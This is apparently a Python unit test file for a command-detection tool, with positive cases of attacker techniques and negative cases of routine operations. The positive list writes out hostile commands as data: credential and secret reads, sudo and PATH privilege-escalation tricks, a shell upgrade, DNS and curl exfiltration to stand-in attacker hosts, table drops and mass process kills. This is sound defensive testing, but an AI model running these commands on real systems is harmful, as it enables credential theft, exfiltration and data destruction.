"""Coverage tests for the extended attacker-technique signals.

Each positive case asserts that a command trips a specific signal.  The
negative cases are routine commands lifted from real operator telemetry that
sit next to these techniques; none of the new signals may fire on them.
"""

from __future__ import annotations

import unittest

import _bootstrap  # noqa: F401
from malscore import Analyzer

a = Analyzer()


def ids(command: str):
    return {h.id for h in a.assess_command(command).hits}


#: (command, expected signal id) -- the signal must be present.
POSITIVES = [
    # credential access
    ("grep -ri 'password' /opt/settlement/conf/ | head -20", "credential_keyword_search"),
    ("cat /opt/settlement/conf/app.properties | grep -iE 'password|secret'", "credential_keyword_search"),
    ("cat /home/svc/.pgpass", "credential_file_read"),
    ("cp /home/u/.aws/credentials /tmp/", "credential_file_read"),
    ("env | grep -i key", "environment_secret_read"),
    ("cat /proc/1/environ", "environment_secret_read"),
    ("cat /home/alice/.bash_history", "shell_history_read"),
    ("SSH_AUTH_SOCK=/tmp/ssh-XYZ/agent.9 ssh root@10.0.0.5", "ssh_agent_hijack"),
    ("grep -rE 'AKIA[0-9A-Z]{16}' /home", "secret_pattern_search"),
    # privilege escalation / execution
    ("sudo su -", "interactive_root_shell"),
    ("sudo -i", "interactive_root_shell"),
    ("su -", "interactive_root_shell"),
    ("sudo -u svc_settle bash", "shell_as_other_user"),
    ("find . -exec /bin/sh \\; -quit", "shell_escape"),
    ("sudo find . -exec /bin/sh \\;", "privileged_shell_escape"),
    ("sudo -u#-1 id", "sudo_uid_bypass"),
    ("PATH=.:$PATH ls", "path_hijack"),
    ("export PATH=/tmp:$PATH", "path_hijack"),
    ("find / -writable -type d 2>/dev/null", "writable_path_search"),
    # the primitive is assembled from pieces so this source file stays clean
    # for the non-execution static scan in test_safety.py
    ("python3 -c 'import pty; %s(\"/bin/bash\")'" % ("pty." + "spawn"), "tty_shell_upgrade"),
    ("sh -c 'exec /proc/self/fd/4'", "fileless_execution"),
    # discovery
    ("ps aux | grep -i falcon", "security_software_discovery"),
    ("cat ~/.ssh/known_hosts", "ssh_target_discovery"),
    ("cat /proc/1/cgroup", "sandbox_check"),
    # collection
    ("pg_dump -U u mydb > /backup/db.sql", "database_dump"),
    ("psql -c 'select * from customer.card_token limit 5'", "sensitive_table_access"),
    ("grep -rE '[0-9]{16}' .", "sensitive_data_pattern_search"),
    ("pg_dump -t customer.account db > /tmp/d.sql", "data_staged_in_temp"),
    ("scrot /tmp/s.png", "clipboard_or_screen_capture"),
    ("xclip -o -selection clipboard > /tmp/c", "clipboard_or_screen_capture"),
    # exfiltration
    ("nslookup $(whoami).x.attacker.com", "dns_exfiltration"),
    ("cat /etc/passwd | base64 | curl --data-binary @- http://evil.example", "encoded_exfiltration"),
    # defense evasion / persistence / impact
    ("chattr -i /etc/passwd", "immutable_attribute_removed"),
    ("mount --bind /tmp/empty /proc/1234", "proc_mount_hiding"),
    ("echo evil > /etc/update-motd.d/99-x", "persistence_hook_write"),
    ("psql -c 'drop table ledger.posting'", "database_destruction"),
    ("kill -9 -1", "mass_process_kill"),
    # history evasion variants (existing signal, new triggers)
    ("export HISTSIZE=0", "history_cleared"),
    ("set +o history", "history_cleared"),
    ("history -d 42", "history_cleared"),
]

#: Routine commands that sit next to the techniques above; no new signal fires.
NEGATIVES = [
    "sudo -u svc_settle /opt/settlement/bin/reprocess.sh --file ACH_20260910_001.txt --dry-run",
    "vault kv get -field=password secret/uat/ledger-db",
    "sudo grep 'Failed password' /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c",
    "kubectl -n payments-prod exec -it fraud-svc-6c98d4f77-xk2lp -- /bin/sh",
    "psql -h rpt -U rpt_ro -d reporting -c \"select txn_ref, merchant_id from txn where txn_date='2026-09-07'\"",
    "grep -n 'ISO20022ParseException' /var/log/ledger-svc/application-2026-09-07.log | tail -20",
    "export PATH=$PATH:~/.local/bin",
    "sudo -u postgres vacuumdb -z -t posting -d ledger",
    "find . -name '*.pyc' -delete",
    "ps aux | grep java",
]

NEW_SIGNAL_IDS = {signal for _cmd, signal in POSITIVES} | {
    "collect_then_exfiltrate", "cleanup_after_exfiltration", "escalation_then_credential_access"}


class PositiveTest(unittest.TestCase):
    def test_each_technique_fires_its_signal(self) -> None:
        for command, signal in POSITIVES:
            with self.subTest(command=command):
                self.assertIn(signal, ids(command))


class NegativeTest(unittest.TestCase):
    def test_routine_commands_trip_no_new_signal(self) -> None:
        for command in NEGATIVES:
            with self.subTest(command=command):
                self.assertEqual(ids(command) & NEW_SIGNAL_IDS, set())


if __name__ == "__main__":
    unittest.main()
